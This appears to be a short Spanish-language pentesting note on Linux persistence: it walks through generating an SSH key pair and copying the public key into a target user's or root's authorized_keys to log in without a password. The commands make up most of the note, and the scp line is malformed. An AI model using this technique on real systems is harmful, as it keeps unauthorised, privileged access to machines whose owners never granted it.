- Tags : #persistencia #persistencia_linux #persistencia_ssh_public_key

Aqui lo que haremos es intentar inyectar nuestra clave publica en la maquina objetivo para poder entrar 

```bash
#Nos creamo un par de claves en nuestra maquina
ssh-keygen

#Se guardan ~/.ssh Nos copiamos la clave publica a la maquina objetivo , le cambiamos el nombre 

mv id_123123.pub authorized_keys

#Nos copiamos el authorized_keys en el directorio ~/.ssh de usuario al que queremos acceder

scp authorized_keys pepe@ip/tmp

mv /tmp/authorized_keys ~/.ssh


#Nos conectamos desde la maquina atacante sin poner passw
ssh pepe@ip

#Si lo copiamos en la .ssh del usuario root pues nos conectamos como root
ssh root@ip 
```